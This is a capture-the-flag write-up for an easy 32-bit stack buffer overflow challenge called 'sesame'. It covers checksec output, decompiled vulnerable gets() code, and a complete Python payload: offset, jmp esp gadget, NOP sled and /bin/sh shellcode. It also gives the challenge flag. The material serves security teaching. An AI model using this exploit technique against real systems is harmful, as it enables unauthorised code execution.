# Challenge

**Name:** sesame

**Category:** pwn

**Difficulty:** Easy  

**Author:** mowemcfc  

**Flag:** ISS{0p3n_5354m3!!1!}  

## Description

Just a simple buffer overflow, no frills, tricks or surprises. We promise!!!

All you need is a buffer offset (pwntools cyclic \<size\>), a `jmp esp` ROP gadget (ropper -f \<filename\>) and your shellcode!

## Solution

The binary has no protections enabled.

```shell
checksec challenge/sesame
[*] '/home/mowe/work/projects/ctf-2022-challenges/pwn/sesame/challenge/sesame'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Note the following decompiled code

```c
  char local_2c [36];
  printf(
        "Here\'s a shellcode! Do you know what to do with it?\n\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\nInput: "
        );
  gets(local_2c);
  return;
```

This is vulnerable to a stack-based buffer overflow, because we are reading an arbitrary number of bytes (via `gets`) into a 36 byte buffer.

In order to pop a shell, we need to do the following with our payload.

1. Overflow the char buffer and gain control of RIP (the return address of the function), with the intention of jumping into the provided shellcode that will execute `execve('/bin/sh')`.
2. Overwrite the original RIP with the address of a `JMP ESP` assembly gadget in our binary. Since ASLR is enabled, we cannot directly jump to the stack address of the shellcode (since we don't know it!), but the top of our input buffer is pointed to by the `ESP` register - thus we can jump to that and execute our shellcode.
3. Provide a assembly blob (aka shellcode) that, when executed, will open a shell over our socket connection.


Shellcode is provided, so the payload should be assembled as such:

```py
RIP_OFFSET = 44
JMPESP_ADDR = 0x080491e7
SHELLCODE = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = b""
payload += b"A" * RIP_OFFSET
payload += p32(JMPESP_ADDR)
payload += b"\x90" * 12
payload += SHELLCODE
```